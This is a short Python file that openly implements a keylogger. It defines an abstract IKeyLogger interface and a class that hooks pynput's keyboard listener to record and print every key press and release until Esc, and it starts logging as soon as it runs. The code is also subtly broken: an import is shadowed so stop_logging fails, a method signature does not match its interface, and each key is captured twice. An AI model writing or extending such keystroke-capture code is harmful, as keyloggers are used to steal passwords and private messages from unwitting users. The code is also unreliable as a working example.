import keyboard
from pynput import keyboard
from pynput.keyboard import Key, Listener
from abc import ABC, abstractmethod
from typing import List
import time

class IKeyLogger(ABC):
     @abstractmethod
     def start_logging(self) -> None:
        pass

     @abstractmethod
     def stop_logging(self) -> None:
         pass

     @abstractmethod
     def get_logged_keys(self) -> List[str]:
        pass




class keyboard_track(IKeyLogger):
    def __init__(self):
        self.keys = ''



    def on_press(self,key):
        if key == Key.esc:
            return False
        self.keys += str(key).replace("'", "")
        print(key)

    def on_release(self,key):
        self.keys += str(key).replace("'", "")
        print(key)


    def start_logging(self) :
        with Listener(on_press=self.on_press,on_release=self.on_release) as listener:
             listener.join()

    def stop_logging(self):
        keyboard.send("esc")


    def get_logged_keys(self,key):
        return self.keys



a = keyboard_track()
a.start_logging()


